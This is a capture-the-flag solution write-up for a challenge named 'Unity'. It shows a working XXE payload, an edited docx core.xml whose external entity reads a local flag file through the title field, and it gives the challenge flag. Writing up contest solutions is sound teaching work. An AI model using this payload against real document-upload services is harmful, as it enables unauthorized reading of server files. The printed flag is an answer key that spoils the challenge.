# Unity Solution

The application is vulnerable to an External XML Entity (XXE) vulnerability. To exploit this, create a docx document and edit `/docprops/core.xml` as follows:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file://flag.txt'>]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dcterms:created xsi:type="dcterms:W3CDTF">2022-04-04T13:58:23Z</dcterms:created><dc:creator>mycreator</dc:creator><dc:description></dc:description><dc:language>en-US</dc:language><cp:lastModifiedBy></cp:lastModifiedBy><dcterms:modified xsi:type="dcterms:W3CDTF">2022-04-04T14:57:39Z</dcterms:modified><cp:revision>4</cp:revision><dc:subject></dc:subject><dc:title>&test;</dc:title></cp:coreProperties>
```

The important bits are the `<!DOCTYPE test [<!ENTITY test SYSTEM 'file://flag.txt'>]>` and `<dc:title>&test;</dc:title>`. The participants get a hint when they upload a docx file "Your file (no title provided) has been uploaded successfully!". This indicates that there is something fishy going on with the `title` element.

Flag: `CCSC{g00d_job_I_4m_sur3_R1ck_w1ll_be_s4fe_with_y0u}`
